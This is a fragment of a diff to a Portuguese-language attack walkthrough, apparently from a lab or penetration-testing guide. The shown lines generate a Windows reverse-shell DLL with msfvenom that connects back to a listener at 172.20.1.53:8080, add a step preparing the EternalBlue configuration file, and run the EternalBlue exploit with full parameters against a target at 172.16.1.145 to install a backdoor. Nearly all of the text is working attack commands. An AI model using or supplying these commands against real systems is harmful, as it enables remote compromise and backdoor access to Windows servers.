@@ -46,6 +46,9 @@ msfvenom -p windows/shell_reverse_tcp LHOST=172.20.1.53 LPORT=8080 -f dll > shel
 
 Instalando backdoor no servidor alvo com EternalBlue:
 ```
+cp Eternalblue-2.2.0.Skeleton.xml Eternalblue-2.2.0.xml
+```
+```
 wine Eternalblue-2.2.0.exe --TargetIp 172.16.1.145 --Target WIN72K8R2 --DaveProxyPort=0 --NetworkTimeout 60 --TargetPort 445 --VerifyTarget True --VerifyBackdoor True --MaxExploitAttempts 3 --GroomAllocations 12 --OutConfig 1.txt
 ```
 - IP do servidor alvo: 172.16.1.145
